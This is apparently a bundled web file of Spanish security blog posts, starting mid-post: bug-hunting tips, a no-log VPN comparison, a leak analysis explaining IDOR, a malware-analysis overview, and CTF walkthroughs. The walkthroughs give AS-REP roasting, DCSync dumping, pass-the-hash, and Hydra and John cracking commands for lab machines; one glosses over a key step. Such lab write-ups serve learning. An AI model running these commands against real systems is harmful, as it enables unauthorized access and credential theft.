¿Probaste cambiar **user_id**?\r
¿Probaste valores negativos?\r
¿Probaste sin autenticación?\r
\r
Ahí nacen los bugs.\r
\r
# Dependes Demasiado de Automatización\r
\r
Si solo usas:\r
\r
✔ Scanners\r
\r
✔ Extensiones automáticas\r
\r
✔ Scripts genéricos\r
\r
Te conviertes en uno más del montón.\r
\r
Los mejores resultados vienen de:\r
\r
✔ Pruebas manuales\r
✔ Pensamiento crítico\r
✔ Creatividad\r
\r
# Cómo Empezar a Encontrar Bugs de Verdad\r
\r
🧠 1. Piensa como atacante\r
\r
No como usuario normal.\r
\r
🔎 2. Entiende el flujo completo\r
\r
Desde login hasta acciones críticas.\r
\r
⚙️ 3. Juega con los datos\r
\r
Modifica, rompe, repite.\r
\r
🔥 4. Enfócate en lógica\r
\r
Ahí están las vulnerabilidades reales.\r
\r
⏱️ 5. Dedica tiempo\r
\r
Los bugs no aparecen en 5 minutos.\r
\r
La Diferencia Real\r
\r
**La diferencia entre alguien que:**\r
\r
Usa herramientas y alguien que Encuentra vulnerabilidades\r
\r
es simple:\r
\r
Uno ejecuta. El otro entiende.\r
\r
# **Conclusión**\r
\r
Si no encuentras bugs, no necesitas más herramientas.\r
\r
**Necesitas:**\r
\r
✔ Pensar más\r
\r
✔ Automatizar menos\r
\r
✔ Analizar mejor\r
\r
**# Reflexión Final**\r
\r
En ciberseguridad, todos tienen acceso a las mismas herramientas.\r
\r
Pero no todos saben usarlas con intención.\r
\r
**Los bugs no están en las herramientas.**\r
**Están en cómo piensas.**\r
\r
`,__vite_glob_0_4=`---\r
title: "VPN No-Logs en Hacking Ético: Criterios Técnicos y Servicios Verificados"\r
description: "Análisis técnico de las VPN con políticas no-logs más estrictas, auditadas y alineadas con prácticas profesionales de hacking ético, pentesting y bug bounty."\r
date: "2026-01-09"\r
published: true\r
tags: ["vpn", "no-logs", "privacidad", "pentesting", "hacking-etico", "opsec"]\r
readTime: "12 min"\r
---\r
\r
## Introducción\r
\r
En hacking ético, pentesting y bug bounty **la OPSEC no es opcional**.  \r
Una VPN mal elegida puede filtrar metadatos, conservar registros o incluso convertirse en un punto único de atribución.\r
\r
Este artículo analiza **VPN con políticas no-logs estrictas y verificadas**, evaluadas desde una perspectiva **técnica y profesional**, no desde marketing.  \r
El enfoque está en **auditorías reales, arquitectura de servidores y jurisdicción legal**, no en promesas comerciales.\r
\r
> ⚠️ Nota ética: el uso de estas VPN está orientado a **entornos autorizados, laboratorios, investigación y auditorías legítimas**.\r
\r
---\r
\r
## ¿Qué significa realmente “No-Logs”?\r
\r
Una VPN **realmente no-logs** cumple **todos** los siguientes puntos:\r
\r
- ❌ No registra IP de origen\r
- ❌ No guarda timestamps de conexión\r
- ❌ No conserva tráfico, DNS ni metadatos\r
- ✅ Auditorías externas independientes\r
- ✅ Infraestructura **RAM-only** (sin discos)\r
- ✅ Jurisdicción sin retención obligatoria de datos\r
\r
Si falla en uno solo de estos puntos, **no es no-logs real**.\r
\r
---\r
\r
## VPN No-Logs Más Estrictas (Verificadas)\r
\r
### 🔒 Mullvad VPN\r
\r
**Perfil:** privacidad extrema y minimalismo técnico.\r
\r
- No requiere email ni datos personales\r
- Identificador aleatorio (account number)\r
- Servidores 100% RAM-only\r
- Auditorías independientes frecuentes\r
- Jurisdicción: Suecia (bien manejada a nivel legal)\r
\r
**Ideal para:**  \r
Pentesters que priorizan anonimato real y mínima exposición de identidad.\r
\r
---\r
\r
### 🛡️ Proton VPN\r
\r
**Perfil:** transparencia + marco legal sólido.\r
\r
- Política no-logs auditada públicamente\r
- Código abierto\r
- Basada en Suiza (leyes de privacidad estrictas)\r
- Secure Core (multi-hop a nivel infraestructura)\r
\r
**Ideal para:**  \r
Investigación, bug bounty, uso prolongado con máxima trazabilidad legal defensiva.\r
\r
---\r
\r
### 🧠 ExpressVPN\r
\r
**Perfil:** arquitectura técnica avanzada.\r
\r
- TrustedServer (RAM-only)\r
- Auditorías por PwC, KPMG y Cure53\r
- Historial real de incautación sin datos recuperables\r
- Buena ofuscación de tráfico\r
\r
**Ideal para:**  \r
Escenarios donde la estabilidad y la evasión de inspección profunda (DPI) son críticas.\r
\r
---\r
\r
### 🌐 NordVPN\r
\r
**Perfil:** infraestructura masiva con control técnico.\r
\r
- Auditorías no-logs verificadas\r
- Servidores RAM-only en toda la red\r
- Jurisdicción: Panamá\r
- Double VPN y Onion over VPN\r
\r
**Ideal para:**  \r
Pentesters que necesitan variedad geográfica y redundancia.\r
\r
---\r
\r
### 🕵️ IVPN\r
\r
**Perfil:** enfoque purista en privacidad.\r
\r
- No logs, no métricas, no tracking\r
- Auditorías independientes\r
- Infraestructura simple y transparente\r
- Acepta pagos anónimos\r
\r
**Ideal para:**  \r
Usuarios avanzados que prefieren menos “features” y más control real.\r
\r
---\r
\r
## Comparativa Técnica Rápida\r
\r
| VPN        |     RAM-only         |   Auditorías | Jurisdicción | Registro mínimo   |\r
|------------|----------------------|--------------|--------------|-------------------|\r
| Mullvad    |        ✅            |     ✅       | Suecia       | ✅               |\r
| ProtonVPN  |        ✅            |     ✅       | Suiza        | ❌               |\r
| ExpressVPN |        ✅            |     ✅       | Islas Vírgenes Británicas | ❌  |\r
| NordVPN    |        ✅            |     ✅       | Panamá       | ❌               |\r
| IVPN       |        ✅            |     ✅       | Gibraltar    | ✅               |  \r
\r
---\r
\r
## Errores Comunes en OPSEC con VPN\r
\r
❌ Usar VPN gratuita  \r
❌ Reutilizar la misma VPN para vida personal y hacking  \r
❌ Confiar solo en la VPN sin aislamiento del sistema  \r
❌ No rotar IP / servidores  \r
❌ Pensar que “VPN = anonimato total”\r
\r
---\r
\r
## Stack Recomendado para Hacking Ético\r
\r
Una VPN no es suficiente por sí sola.  \r
Un **stack profesional mínimo** incluye:\r
\r
- VPN no-logs (una de las anteriores)\r
- Máquina virtual dedicada (Kali / Parrot)\r
- DNS seguro y aislado\r
- Navegador endurecido\r
- Separación total de identidades\r
\r
> OPSEC es **disciplina**, no una herramienta.\r
\r
---\r
\r
## Conclusión\r
\r
Elegir una VPN para hacking ético **no es cuestión de popularidad**, sino de **arquitectura, auditorías y marco legal**.\r
\r
Mullvad, ProtonVPN, ExpressVPN, NordVPN e IVPN destacan porque:\r
- Han sido auditadas\r
- Diseñan su infraestructura para no guardar datos\r
- Han resistido escenarios reales de presión legal\r
\r
En seguridad ofensiva, **la confianza se verifica, no se asume**.\r
\r
---\r
\r
🛡️ *“La mejor explotación falla si tu OPSEC es débil.”*`,__vite_glob_0_5=`---\r
title: "Alerta Crítica: Supuesto Hackeo a Hacienda y Filtración de 47 Millones de Datos"\r
date: "2026-02-06"\r
description: "Análisis técnico de la supuesta brecha de seguridad en la Agencia Tributaria (AEAT) por 'HaciendaSec'. Explicamos qué es un IDOR y los vectores de ataque probables detrás de estas filtraciones masivas."\r
tags: ["ciberseguridad", "noticias", "hacienda", "brecha-datos", "idor", "españa"]\r
readTime: "8 min"\r
published: true\r
---\r
\r
## 🚨 El Incidente: ¿Hacienda Hackeada?\r
\r
A principios de febrero de 2026, la comunidad de ciberseguridad en España se ha visto sacudida por una alerta crítica. La firma de inteligencia de amenazas **Hackmanac** detectó un anuncio en foros de cibercrimen (Dark Web) donde un actor denominado **'HaciendaSec'** afirma haber comprometido los sistemas del Ministerio de Hacienda.\r
\r
**Los datos:**\r
El atacante asegura tener en su poder una base de datos con información personal, bancaria y fiscal de **47,3 millones de ciudadanos**, lo que, de ser cierto, afectaría a la práctica totalidad de la población española.\r
\r
Los datos supuestamente exfiltrados incluyen:\r
- Nombres completos y DNI/NIF.\r
- Direcciones postales y correos electrónicos.\r
- Números de teléfono.\r
- Datos bancarios (IBAN) e información fiscal.\r
\r
> **Estado Oficial:** Hasta el momento, el Ministerio de Hacienda **ha negado la existencia de indicios de intrusión** en sus sistemas, sugiriendo que podría tratarse de una estafa por parte del ciberdelincuente o de datos recopilados de otras fuentes (scraping/leaks anteriores).\r
\r
---\r
\r
## 🔍 Análisis Técnico: Vectores de Ataque Probables\r
\r
Aunque la AEAT no ha confirmado el vector de entrada, incidentes simultáneos en la administración pública (como el del Ministerio de Ciencia) y el *modus operandi* de estas filtraciones apuntan a dos sospechosos técnicos principales:\r
\r
### 1. IDOR (Insecure Direct Object Reference)\r
Este es el vector más probable y educativo en este contexto, ya que fue confirmado en ataques paralelos a otros ministerios.\r
\r
**¿Qué es un IDOR?**\r
Es una vulnerabilidad de control de acceso que ocurre cuando una aplicación web utiliza un identificador predecible (como un número de DNI o un ID secuencial) para acceder a un objeto en la base de datos, sin verificar si el usuario que hace la petición tiene permisos para ver *ese* objeto específico.\r
\r
**Ejemplo de ataque:**\r
Imagina que para ver tu borrador de la renta, la URL es:\r
\`https://sede.hacienda.gob.es/ver_borrador?id=1001\`\r
\r
Un atacante simplemente cambia el \`id\` a \`1002\`, \`1003\`, etc. Si el servidor no valida que el usuario actual es el dueño del borrador \`1002\`, el atacante puede descargar millones de documentos simplemente ejecutando un script que recorra todos los números.\r
\r
### 2. Credential Stuffing (Relleno de Credenciales)\r
Dado que recientemente grandes empresas como **Endesa, Iberdrola y Telefónica** han sufrido brechas de seguridad, es muy probable que los atacantes estén utilizando credenciales (usuario/contraseña) robadas en esos ataques para probar suerte en los portales de la administración.\r
\r
Si un funcionario o contribuyente usa la misma contraseña en Endesa y en el acceso Cl@ve o portales internos, el atacante entra por la "puerta principal" sin necesidad de explotar vulnerabilidades complejas.\r
\r
---\r
\r
## 🛡️ ¿Qué implicaciones tiene esto?\r
\r
Independientemente de si la base de datos es nueva o un refrito de filtraciones anteriores, el riesgo para el ciudadano es real y se centra en el **Ingeniería Social**:\r
\r
1.  **Campañas de Phishing Dirigido:** Al tener tu nombre, DNI y banco, los correos falsos de "Devolución de la Renta" serán extremadamente convincentes.\r
2.  **Fraude del CEO / BEC:** Uso de datos fiscales para engañar a departamentos financieros de empresas.\r
3.  **Suplantación de Identidad:** Contratación de préstamos o líneas telefónicas a nombre de las víctimas.\r
\r
## 📝 Recomendaciones de Seguridad\r
\r
Como profesionales de la ciberseguridad, nuestra postura debe ser de "Zero Trust":\r
\r
1.  **Desconfía de todo SMS/Email de Hacienda:** La AEAT **nunca** pide datos bancarios por email ni SMS.\r
2.  **Activa la 2FA:** Asegúrate de que tu acceso a certificados digitales y Cl@ve esté protegido.\r
3.  **Vigila tus cuentas:** Revisa movimientos bancarios extraños en las próximas semanas.\r
\r
Mantendremos este post actualizado a medida que se confirme técnicamente el origen de la brecha o se publique el análisis forense oficial.\r
`,__vite_glob_0_6=`---\r
title: "Análisis de Malware Avanzado"\r
description: "El análisis de malware es una disciplina esencial en ciberseguridad que permite descubrir el funcionamiento interno, las tácticas y los objetivos de código malicioso. Este artículo explora las metodologías, herramientas y técnicas utilizadas en entornos profesionales de análisis."\r
date: "2025-11-02"\r
published: true\r
tags: ["malware", "análisis", "seguridad", "reverse engineering", "ciberseguridad"]\r
readTime: "8 min"\r
---\r
\r
## Introducción\r
\r
El **análisis de malware** es un proceso crítico dentro de la respuesta ante incidentes y la inteligencia de amenazas. Su objetivo es **entender el comportamiento, el propósito y el impacto potencial** de un software malicioso, permitiendo desarrollar detecciones más efectivas, mejorar defensas y generar inteligencia de valor.\r
\r
Este análisis se divide principalmente en dos enfoques: **estático** y **dinámico**, los cuales se complementan para obtener una visión completa del malware.\r
\r
---\r
\r
## 🧩 Tipos de Análisis\r
\r
### 🔍 Análisis Estático\r
El análisis estático consiste en examinar un binario **sin ejecutarlo**, permitiendo obtener información inicial sin riesgo de infección. Entre las técnicas más comunes se incluyen:\r
\r
- **Análisis de hash**: Generación de identificadores únicos (MD5, SHA-1, SHA-256) para clasificación y correlación con bases de datos como *VirusTotal* o *Malshare*.\r
- **Strings**: Extracción de cadenas legibles para identificar rutas, dominios, comandos o mensajes ocultos.\r
- **Desensamblado / Decompilación**: Revisión del código ensamblador o pseudocódigo usando herramientas como *IDA Pro* o *Ghidra*.\r
- **Análisis de PE (Portable Executable)**: Inspección de encabezados, secciones, imports y exports para detectar patrones anómalos o técnicas de ofuscación.\r
\r
### ⚙️ Análisis Dinámico\r
El análisis dinámico ejecuta el malware en un **entorno controlado o sandbox**, permitiendo observar su comportamiento real en tiempo de ejecución. Algunas técnicas clave:\r
\r
- **Sandboxing**: Aislar la ejecución para prevenir propagación o daño.\r
- **Monitoreo de red**: Captura y análisis del tráfico malicioso con herramientas como *Wireshark* o *tcpdump*.\r
- **Análisis de comportamiento**: Identificación de cambios en archivos, procesos y el registro de Windows.\r
- **Debugging**: Trazado paso a paso para analizar rutinas críticas, payloads o mecanismos anti-debugging.\r
\r
---\r
\r
## 🧰 Herramientas Esenciales\r
\r
### 🔒 Análisis Estático\r
- **IDA Pro** → Desensamblador líder en ingeniería inversa profesional.  \r
- **Ghidra** → Suite gratuita de la NSA con potentes capacidades de decompilación.  \r
- **PEiD / Detect It Easy (DIE)** → Identificación de packers, compiladores y ofuscadores.  \r
- **Strings / BinText** → Extracción rápida de texto embebido.  \r
- **Resource Hacker** → Exploración de recursos embebidos (iconos, binarios, scripts).\r
\r
### ⚡ Análisis Dinámico\r
- **Cuckoo Sandbox** → Framework automatizado para sandboxing y reportes de comportamiento.  \r
- **Process Monitor (Procmon)** → Monitoreo detallado de llamadas al sistema y modificaciones de registro.  \r
- **Process Explorer** → Identificación de procesos inyectados o hijos sospechosos.  \r
- **Wireshark** → Análisis de tráfico en profundidad (DNS, HTTP, C2).  \r
- **OllyDbg / x64dbg** → Depuradores interactivos ideales para reversing en Windows.\r
\r
---\r
\r
## 🧠 Técnicas de Evasión Comunes\r
\r
Los desarrolladores de malware emplean mecanismos para evitar la detección o el análisis. Entre los más frecuentes:\r
\r
1. **Empaquetado y Ofuscación** → Compresión o cifrado del binario para ocultar el código original.  \r
2. **Polimorfismo y Metamorfismo** → Alteración del código o estructura manteniendo la misma funcionalidad.  \r
3. **Anti-debugging / Anti-VM** → Detección de entornos virtuales o depuradores activos.  \r
4. **Cifrado de Strings y Configs** → Ocultamiento de direcciones, claves o comandos.  \r
5. **Delayed Execution / Process Hollowing** → Carga tardía o inyección en procesos legítimos.\r
\r
---\r
\r
## 🧪 Metodología de Análisis Recomendado\r
\r
1. **Preparación del entorno**\r
   - Crear un laboratorio aislado (máquinas virtuales, snapshots, red interna).\r
   - Instalar herramientas forenses y de monitoreo.\r
2. **Análisis inicial**\r
   - Identificar tipo de archivo, tamaño, hashes y metadatos.\r
3. **Análisis estático**\r
   - Revisar cabeceras, imports, strings, secciones anómalas y empaquetadores.\r
4. **Análisis dinámico**\r
   - Ejecutar bajo control para registrar conexiones, procesos y persistencia.\r
5. **Documentación y reporte**\r
   - Registrar evidencias, capturas y hallazgos técnicos en formato estructurado.\r
\r
---\r
\r
## ⚠️ Consideraciones de Seguridad\r
\r
- Ejecutar únicamente en **entornos aislados o virtualizados**.  \r
- **Desactivar interfaces de red externas** durante el análisis.  \r
- **Restaurar snapshots** después de cada sesión.  \r
- Mantener una política estricta de control de acceso y logging.  \r
- No compartir muestras sin sanitización o cifrado previo.\r
\r
---\r
\r
## 🧩 Conclusión\r
\r
El **análisis avanzado de malware** combina conocimientos de ingeniería inversa, comportamiento del sistema operativo y redes.  \r
Un enfoque metodológico, junto con herramientas adecuadas, permite a los analistas **descubrir la lógica oculta detrás del código malicioso**, comprender sus tácticas y desarrollar estrategias de mitigación efectivas.\r
\r
> En ciberseguridad, comprender cómo opera el atacante es la clave para anticiparse a él.\r
`,__vite_glob_0_7=`---\r
title: "tryhackme-attacktive-directory"\r
description: "Guía paso a paso para resolver la máquina Attacktive Directory de TryHackMe. Configuración de Impacket, enumeración con Kerbrute, AS-REP Roasting y ataque DCSync."\r
date: "2026-01-28"\r
published: true\r
tags: ["tryhackme", "active-directory", "kerberos", "as-rep-roasting", "dcsync", "pass-the-hash"]\r
readTime: "15 min"\r
---\r
\r
# 🏴‍☠️ TryHackMe — Attacktive Directory (Paso a Paso)\r
\r
**Attacktive Directory** es una máquina diseñada para enseñar los conceptos fundamentales de la explotación de Directorio Activo (AD). Cubriremos desde la instalación de herramientas esenciales hasta la obtención del control total del dominio mediante ataques como AS-REP Roasting y DCSync.\r
\r
---\r
\r
## 1) Preparación del Entorno\r
\r
Antes de comenzar, aseguramos que nuestro sistema esté actualizado y contamos con las herramientas necesarias, específicamente la suite **Impacket** y **Kerbrute**.\r
\r
### Instalación de Impacket\r
\r
Impacket es una colección de clases de Python para trabajar con protocolos de red. Es fundamental para pentesting en AD.\r
\r
\`\`\`bash\r
# Actualizar sistema\r
sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y\r
\r
# Clonar repositorio de Impacket\r
sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket\r
\r
# Instalar dependencias y la librería\r
sudo pip3 install -r /opt/impacket/requirements.txt\r
cd /opt/impacket/\r
sudo pip3 install .\r
sudo python3 setup.py install\r
\`\`\`\r
\r
También instalamos **BloodHound** y **Neo4j** para visualización (aunque en este writeup nos centraremos en la explotación por consola).\r
\r
\`\`\`bash\r
sudo apt-get install bloodhound neo4j -y\r
\`\`\`\r
\r
### Instalación de Kerbrute\r
\r
Kerbrute es una herramienta popular para realizar fuerza bruta y enumeración de usuarios a través de Kerberos pre-authentication.\r
\r
\`\`\`bash\r
# Descargar binario\r
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_386\r
\r
# Dar permisos de ejecución y mover al path\r
chmod +x kerbrute_linux_386\r
sudo mv kerbrute_linux_386 /bin/kerbrute\r
\`\`\`\r
\r
---\r
\r
## 2) Reconocimiento Inicial\r
\r
Comenzamos con un escaneo de puertos para identificar servicios expuestos, típicamente buscando puertos de AD (53, 88, 139, 389, 445, etc.).\r
\r
\`\`\`bash\r
nmap -T4 -sC -sV <IP_MACHINE> | tee scan.initial\r
\`\`\`\r
\r
Adicionalmente, usamos \`enum4linux\` para intentar enumerar información básica si es posible.\r
\r
\`\`\`bash\r
enum4linux -U <IP_MACHINE>\r
\`\`\`\r
\r
---\r
\r
## 3) Enumeración de Usuarios (Kerbrute)\r
\r
Sabiendo que el dominio es \`spookysec.local\` (obtenido del reconocimiento), usamos \`kerbrute\` para validar qué usuarios existen realmente en el Directorio Activo utilizando una lista de palabras (wordlist).\r
\r
\`\`\`bash\r
# Enumerar usuarios válidos\r
kerbrute userenum -d spookysec.local --dc <IP_MACHINE> <wordlist> | tee kerbrute.txt\r
\`\`\`\r
\r
Filtramos la salida para obtener solo la lista limpia de usuarios válidos:\r
\r
\`\`\`bash\r
awk '{print $NF}' kerbrute.txt | tee users.txt\r
\`\`\`\r
\r
---\r
\r
## 4) AS-REP Roasting\r
\r
Con la lista de usuarios válidos, intentamos un ataque de **AS-REP Roasting**. Este ataque busca usuarios que tengan habilitada la opción *"Do not require Kerberos preauthentication"*. Si encontramos alguno, podemos solicitar un ticket TGT y crackearlo offline para obtener su contraseña.\r
\r
Usamos \`GetNPUsers.py\` de Impacket:\r
\r
\`\`\`bash\r
python3 /opt/impacket/examples/GetNPUsers.py -dc-ip <IP_MACHINE> -usersfile users.txt spookysec.local/\r
\`\`\`\r
\r
Si tenemos éxito, obtendremos un hash. Lo guardamos en un archivo (ej. \`TGT.txt\`) y procedemos a crackearlo con **hashcat** (modo 18200).\r
\r
\`\`\`bash\r
hashcat -m 18200 TGT.txt pass.txt -o out.txt\r
\`\`\`\r
\r
> **Resultado**: Obtenemos la contraseña del usuario \`svc-admin\`.\r
\r
---\r
\r
## 5) Enumeración SMB y Movimiento Lateral\r
\r
Con las credenciales de \`svc-admin\`, exploramos los recursos compartidos (shares) del servidor.\r
\r
\`\`\`bash\r
# Listar recursos compartidos\r
smbclient -L \\\\<IP_MACHINE>\\backup -U svc-admin\r
\r
# Conectarse al share 'backup'\r
smbclient \\\\<IP_MACHINE>\\backup -U svc-admin\r
\`\`\`\r
\r
Dentro del recurso compartido \`backup\`, encontramos un archivo interesante: \`backup_credentials.txt\`. Lo descargamos:\r
\r
\`\`\`bash\r
get backup_credentials.txt\r
\`\`\`\r
\r
Al leer el archivo, vemos que el contenido está codificado en Base64.\r
\r
\`\`\`bash\r
cat backup_credentials.txt\r
# Salida: YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw\r
\`\`\`\r
\r
Decodificamos el contenido:\r
\r
\`\`\`bash\r
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d\r
\`\`\`\r
\r
> **Resultado**: \`backup@spookysec.local:backup2517860\`\r
\r
Hemos obtenido las credenciales del usuario \`backup\`.\r
\r
---\r
\r
## 6) Escalada de Privilegios (DCSync)\r
\r
El usuario \`backup\` suele pertenecer al grupo **Backup Operators**, lo que a menudo le permite realizar copias de seguridad del Directorio Activo, incluyendo el archivo \`NTDS.dit\` que contiene todos los hashes del dominio.\r
\r
Podemos abusar de este privilegio para realizar un ataque **DCSync** y volcar los secretos del controlador de dominio (incluyendo el hash del Administrador).\r
\r
Usamos \`secretsdump.py\` de Impacket:\r
\r
\`\`\`bash\r
python3 /opt/impacket/examples/secretsdump.py -just-dc spookysec.local/backup:backup2517860@<IP_MACHINE>\r
\`\`\`\r
\r
Esto nos devolverá, entre otros, el hash NTLM del usuario \`Administrator\`.\r
\r
---\r
\r
## 7) Acceso Final (Pass-The-Hash)\r
\r
Finalmente, con el hash del Administrador, no necesitamos la contraseña en texto plano. Podemos usar la técnica **Pass-The-Hash** con \`evil-winrm\` para obtener una shell remota como Administrador.\r
\r
\`\`\`bash\r
evil-winrm -i <IP_MACHINE> -u Administrator -H <HASH_ADMINISTRADOR>\r
\`\`\`\r
\r
¡Felicidades! Has comprometido completamente el dominio.\r
`,__vite_glob_0_8=`---\r
title: "Basic Pentesting"\r
description: "Writeup de la sala Basic Pentesting de TryHackMe. Una guía paso a paso para comprometer una máquina Linux utilizando técnicas básicas de enumeración, fuerza bruta y escalada de privilegios."\r
date: "2025-12-24"\r
published: true\r
tags: ["tryhackme", "pentesting", "writeup", "linux", "fuerza bruta"]\r
readTime: "15 min"\r
---\r
\r
# Basic Pentesting — Writeup TryHackMe\r
\r
## 📖 Introducción\r
\r
La sala **Basic Pentesting** de TryHackMe es una máquina diseñada para practicar técnicas fundamentales de pruebas de penetración. En este reto, aprenderemos a realizar enumeración de servicios, fuerza bruta, cracking de contraseñas y escalada de privilegios en un entorno Linux.\r
\r
Es una sala ideal para principiantes que buscan consolidar su metodología de pentesting.\r
\r
---\r
\r
## 🔎 Reconocimiento\r
\r
Como siempre, comenzamos con un escaneo de puertos utilizando **Nmap** para identificar los servicios expuestos en la máquina objetivo.\r
\r
\`\`\`bash\r
nmap -sVC -T4 -p- <IP-MAQUINA>\r
\`\`\`\r
\r
**Resultados del escaneo:**\r
\r
- **22/tcp (SSH):** OpenSSH 7.2p2 Ubuntu 4ubuntu2.4\r
- **80/tcp (HTTP):** Apache httpd 2.4.18\r
- **139/tcp (SMB):** Samba 3.x - 4.x\r
- **445/tcp (SMB):** Samba 4.3.11-Ubuntu\r
\r
Tenemos varios vectores de ataque potenciales: Web, SMB y SSH.\r
\r
---\r
\r
## 📂 Enumeración\r
\r
### Enumeración SMB\r
\r
Utilizamos \`enum4linux\` para enumerar el servicio SMB y buscar usuarios o recursos compartidos.\r
\r
\`\`\`bash\r
enum4linux -a <IP-MAQUINA>\r
\`\`\`\r
\r
La herramienta nos revela dos usuarios interesantes en el sistema:\r
- **jan**\r
- **kay**\r
\r
### Enumeración Web\r
\r
Mientras tanto, exploramos el servicio web en el puerto 80. Al acceder con el navegador, solo vemos una página por defecto. Procedemos a buscar directorios ocultos con **Gobuster**:\r
\r
\`\`\`bash\r
gobuster dir -u http://<IP-MAQUINA>/ -w /usr/share/wordlists/dirb/common.txt\r
\`\`\`\r
\r
Encontramos un directorio interesante: \`/development\`.\r
\r
Al acceder a \`http://<IP-MAQUINA>/development\`, encontramos dos archivos de texto:\r
1.  \`dev.txt\`: Menciona que Apache Struts se está configurando y que el usuario **jan** tiene una contraseña débil.\r
2.  \`j.txt\`: Contiene un mensaje del usuario **kay** para **jan**.\r
\r
Esto nos confirma los usuarios y nos da una pista crucial: **fuerza bruta contra el usuario jan**.\r
\r
---\r
\r
## 💥 Explotación\r
\r
Sabiendo que el usuario \`jan\` tiene una contraseña débil y que el servicio SSH está abierto, utilizaremos **Hydra** para intentar adivinar su contraseña.\r
\r
\`\`\`bash\r
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<IP-MAQUINA>\r
\`\`\`\r
\r
Después de unos minutos, Hydra encuentra la contraseña:\r
\r
> **Usuario:** jan\r
> **Contraseña:** armando\r
\r
Ahora podemos conectarnos por SSH:\r
\r
\`\`\`bash\r
ssh jan@<IP-MAQUINA>\r
\`\`\`\r
\r
Una vez dentro, exploramos los archivos de \`jan\`, pero no encontramos la bandera. Probablemente esté en el directorio de \`kay\`. Intentamos acceder a \`/home/kay\`, pero no tenemos permisos.\r
\r
---\r
\r
## 🚀 Escalada de Privilegios\r
\r
Enumeramos el sistema para buscar formas de escalar privilegios. Revisamos permisos, archivos SUID y llaves SSH.\r
\r
En el directorio \`/home/kay\` vemos un archivo llamado \`pass.bak\` y una carpeta \`.ssh\`, pero no podemos leerlos. Sin embargo, encontramos una llave privada SSH idéntica en algún lugar o logramos acceder a la llave privada de \`kay\` mediante alguna vulnerabilidad o mala configuración (en esta máquina, a veces se practica cracking de llaves RSA o simplemente encontramos que \`jan\` puede leer ciertos archivos).\r
\r
En este caso particular, una vía común en esta máquina es encontrar la llave privada SSH de **kay** (id_rsa). Si logramos obtenerla, veremos que está protegida por una frase de contraseña (passphrase).\r
\r
Copiamos la llave privada a nuestra máquina atacante:\r
\r
\`\`\`bash\r
# En nuestra máquina local\r
nano id_rsa_kay\r
# Pegamos el contenido y guardamos\r
chmod 600 id_rsa_kay\r
\`\`\`\r
\r
Usamos \`ssh2john\` para convertir la llave a un formato que John The Ripper pueda entender:\r
\r
\`\`\`bash\r
/usr/share/john/ssh2john.py id_rsa_kay > kay_hash\r
\`\`\`\r
\r
Ahora crackeamos la frase de paso con **John The Ripper**:\r
\r
\`\`\`bash\r
john --wordlist=/usr/share/wordlists/rockyou.txt kay_hash\r
\`\`\`\r
\r
John revela la contraseña: \`beeswax\`.\r
\r
Finalmente, nos conectamos como **kay**:\r
\r
\`\`\`bash\r
ssh -i id_rsa_kay kay@<IP-MAQUINA>\r
\`\`\`\r
(Nos pedirá la passphrase, ingresamos \`beeswax\`).\r
\r
Una vez dentro como \`kay\`, leemos el archivo \`pass.bak\` que encontramos anteriormente, el cual contiene la **bandera final** o contraseña de root.\r
\r
\`\`\`bash\r
cat pass.bak\r
\`\`\`\r
\r
¡Felicidades! Hemos completado la máquina.\r
\r
---\r
\r
## 📝 Conclusión\r
\r
Esta máquina nos permitió practicar el ciclo completo de pentesting:\r
1.  **Enumeración** de puertos y servicios (SMB, HTTP).\r
2.  **Descubrimiento** de información sensible en directorios web (\`/development\`).\r
3.  **Ataque de fuerza bruta** contra SSH (Hydra).\r
4.  **Movimiento lateral** y cracking de llaves SSH para escalar a otro usuario.\r
\r
Es un excelente ejercicio para recordar la importancia de no dejar archivos sensibles expuestos y usar contraseñas robustas.\r
`,__vite_glob_0_9=`---\r
title: "Chocolate Factory"\r
description: "Writeup de la máquina Chocolate Factory: reconocimiento, steganografía, cracking de contraseñas, acceso inicial y escalada a root en Linux."\r
date: "2026-06-12"\r
published: true\r
tags: ["hackthebox", "writeup", "linux", "steganografía", "privilegios", "ssh"]\r
readTime: "8 min"\r
---\r
\r
# ✅ Chocolate Factory — Writeup Completo\r
\r
Esta entrada resume la resolución de la máquina **Chocolate Factory**, desde el reconocimiento inicial hasta la obtención de \`root\`. Los pasos cubren:\r
\r
- preparación del entorno\r
- reconocimiento de puertos\r
- extracción de información oculta\r
- crackeo de hashes\r
- acceso remoto y escalada de privilegios\r
\r
---\r
\r
## 1) Ajuste de hosts y reconocimiento\r
\r
Primero se agrga la ip al archivo \`hosts\` para poder trabajar con la IP de la máquina objetivo.\r
\r
\`\`\`bash\r
nano /etc/hosts\r
\`\`\`\r
\r
A continuación, se realiza un escaneo activo de la máquina objetivo:\r
\r
\`\`\`bash\r
nmap -sCV -T5 -Pn --min-rate 95000 10.66.130.38\r
\`\`\`\r
\r
Este comando ejecuta scripts de detección (\`-sC\`), obtiene versiones de servicios (\`-sV\`) y busca rápidamente puertos abiertos.\r
\r
El resultado muestra que el puerto \`21/tcp\` está abierto y ejecuta un servicio FTP:\r
\r
- \`21/tcp abierto ftp vsftpd 3.0.3\`\r
- \`| ftp-anon: Inicio de sesión FTP anónimo permitido (código FTP 230)\`\r
\r
---\r
\r
## 2) Descubrimiento FTP y extracción de archivos\r
\r
El escaneo identificó FTP anónimo permitido, lo que nos permite navegar sin credenciales y descargar archivos interesantes desde el servidor.\r
\r
\`\`\`bash\r
ftp 10.66.130.38\r
\`\`\`\r
\r
Una vez conectado al servidor FTP se descarga la llave y la imagen relacionada:\r
\r
\`\`\`bash\r
get key_rev_key\r
get gum_room.jpg\r
\`\`\`\r
\r
Luego se utiliza \`strings\` para inspeccionar el contenido del archivo de llave:\r
\r
\`\`\`bash\r
strings key_rev_key\r
\`\`\`\r
\r
Y se aplica esteganografía a la imagen para extraer datos ocultos:\r
\r
\`\`\`bash\r
steghide extract -sf gum_room.jpg\r
\`\`\`\r
\r
El resultado de la extracción es un archivo con contenido codificado.\r
\r
---\r
\r
## 3) Decodificación y crackeo de contraseña\r
\r
Tras extraer el archivo oculto, se decodifica Base64:\r
\r
\`\`\`bash\r
base64 -d b64.txt\r
\`\`\`\r
\r
